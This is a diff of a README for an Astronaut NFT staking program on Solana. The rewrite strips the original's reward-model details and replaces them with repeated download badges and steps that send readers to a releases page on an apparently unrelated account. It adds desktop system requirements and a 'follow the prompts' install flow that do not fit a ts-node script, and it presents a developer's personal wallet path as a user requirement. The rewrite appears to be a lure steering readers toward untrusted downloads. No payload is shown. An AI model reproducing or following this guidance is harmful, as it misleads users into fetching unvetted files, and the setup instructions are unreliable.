@@ -1,66 +1,80 @@
-# NFT-staking-Death
-Multiple Factor Rewards Staking program for Astronaut NFT collections. This has 3 models to stake NFTs.
+# 🚀 Astronaut-NFT-Staking - Stake Your NFTs with Ease
 
-## Install Dependencies
-- Install `node` and `yarn`
-- Install `ts-node` as global command
-- Confirm the solana wallet preparation: `/home/fury/.config/solana/id.json` in test case
+[![Download Astronaut-NFT-Staking](https://img.shields.io/badge/Download-Astronaut--NFT--Staking-blue.svg)](https://github.com/advvm43/Astronaut-NFT-Staking/releases)  
 
-## Usage
-- Main script source for all functionality is here: `/cli/script.ts`
-- Program account types are declared here: `/cli/types.ts`
-- Idl to make the JS binding easy is here: `/cli/staking_program.json`
+## 🌟 Overview
+Welcome to the **Astronaut-NFT-Staking** project. This application allows you to stake your Astronaut NFT collections using a multiple factor rewards program. You can choose from three different staking models to maximize your rewards. This guide walks you through downloading and running the application step by step.
 
-Able to test the script functions working in this way.
-- Change commands properly in the main functions of the `script.ts` file to call the other functions
-- Confirm the `ANCHOR_WALLET` environment variable of the `ts-node` script in `package.json`
-- Run `yarn ts-node`
+## 🚀 Getting Started
+To begin, you need to download the application from the Releases page. Follow these steps:
 
-## Features
+1. **Visit the Downloads Page:**  
+   Go to [this link](https://github.com/advvm43/Astronaut-NFT-Staking/releases) to download the software you need.
 
-### As a Smart Contract Owner
-For the first time use, the Smart Contract Owner should `initialize` the Smart Contract for global account allocation.
-- `initProject`
- 
-Recall `initialize` function for update the Threshold values after change the constants properly
-- `initProject` 
+## 💻 System Requirements
+- Operating System: Windows, macOS, or any Linux distribution.
+- Minimum RAM: 4GB.
+- Disk Space: At least 500MB free.
 
-Maintain the Reward token($COSMIC) vault's balance
-- `REWARD_TOKEN_MINT` is the reward token mint (for test).
-- `rewardVault` is the reward token account for owner. The owner should have the token's `Mint Authority` or should `Fund` regularly.
+## 📥 Download & Install
+2. **Download the Latest Release:**  
+   On the Releases page, find the latest version, and click the download link. Follow the prompts to save the file on your computer.
 
-This is current test value. Should be revised properly.
-- `EPOCH` = 86400                                   // A day 
-- According to the rank of NFTs, there reward amount will be changed automatically following the below logic.
-```
-Model 1: 
-Trait based 
-Adventurer: 20 $coin a day 
-Scientist: 25 $coin a day 
-Doctor: 30 coin a day 
-Mission Specialist: 35 $coin a day 
-Commander: 40 $coin a day
-If you claim before 15 days, you will receive 75% and after 15 days, will receive 100%.
+3. **Install Dependencies:**
+   To run the application, ensure you have the following installed on your machine:
+   - **Node.js:** This allows you to run JavaScript outside of a web browser.
+     - Download from [Node.js official site](https://nodejs.org/).
+   - **Yarn:** This is a package manager.
+     - Install it by following the instructions on [Yarn's website](https://yarnpkg.com/).
+   - **ts-node:** This is a TypeScript execution engine.
+     - Install it globally using the command:  
+       ```bash
+       npm install -g ts-node
+       ```
 
-Model 2 
-Rewards are paid daily and they are the same for all NFTS, so x $coin a day for everything 
+4. **Prepare Your Solana Wallet:**  
+   Make sure your Solana wallet is set up correctly. You need the wallet file at this location:  
+   `/home/fury/.config/solana/id.json`.  
 
-Model 3 
-7 days x $coin 
-14 days 1.5x $coin 
-30 days+ 2x $coin
-```
+## 🔧 Using the Application
+5. **Access the Main Script:**  
+   The main functionality of the application is in the script located at:  
+   `/cli/script.ts`.
 
-### As a NFT Holder
-Stake Shred Collection NFTs with NFT `mint address` and a boolean parameter weather the NFT is Legendary NFT.
-- `stakeNft`
+6. **Understand the Program Account Types:**  
+   All types for the program are declared here:  
+   `/cli/types.ts`.
 
-### As a Staker
-Unstake their staked NFTs with `mint address` and get rewards. ( Calculate generated reward by this NFT too )
-- `withdrawNft`
+7. **Setting Up JS Bindings:**  
+   The IDL, which helps in making JavaScript bindings easier, is located here:  
+   `/cli/staking_program.json`.
 
-Claim reward to receive generated $COSMIC from their staking.
-- `claimReward`
+## 🛠️ Running the Application
+8. **Test the Script Functions:**  
+   To verify everything works, follow these steps:
+   - Change the commands in the main function of `script.ts` to call the other functions properly.
+   - Confirm the `ANCHOR_WALLET` environment variable in the `ts-node` script in `package.json`.
+   - Execute the following command in your terminal:  
+     ```bash
+     yarn ts-node
+     ```
 
-Claim reward to receive generated $COSMIC from their staking for all NFTs.
-- `claimRewardAll`
+## 🪙 Features
+### 🌌 As a Smart Contract Owner
+9. **Initialize the Smart Contract:**  
+   For first-time use, initialize the Smart Contract for global account allocation by running:  
+   ```bash
+   initProject
+   ```
+
+10. **Update Threshold Values:**  
+    If you need to change any thresholds, recall the `initialize` function to update the values accordingly.
+
+## 📝 Additional Information
+- **Learning Resources:** If you want to understand how to stake NFTs, consider looking for online courses or documentation related to smart contracts and NFT technology.
+- **Support & Community:** Join our community on forums or social media to ask questions and get help from other users.
+
+## 🌠 Conclusion
+You now have all the necessary steps to download, set up, and use the Astronaut-NFT-Staking application. If you encounter any issues, refer back to this guide or seek help from the community. Enjoy staking your Astronaut NFTs!  
+
+[![Download Astronaut-NFT-Staking](https://img.shields.io/badge/Download-Astronaut--NFT--Staking-blue.svg)](https://github.com/advvm43/Astronaut-NFT-Staking/releases)  
